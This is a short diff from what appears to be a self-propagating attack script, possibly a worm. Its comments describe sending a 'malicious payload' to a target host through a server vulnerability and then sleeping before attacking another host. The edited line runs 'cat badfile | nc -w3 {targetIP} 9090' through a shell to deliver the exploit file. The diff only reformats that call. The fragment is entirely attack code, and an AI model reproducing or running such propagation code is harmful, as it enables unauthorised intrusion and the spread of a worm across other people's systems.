@@ -296,8 +296,7 @@ while True:
     # Send the malicious payload (smaller payload) to the target host
     # This is done via exploiting the server's vulnerability
     # It will block until the command exits
-    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], 
-                     shell=True, stdin=None, close_fds=True)
+    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
 
     # Sleep for 1000 seconds before attacking another host
     # We will reduce this value later
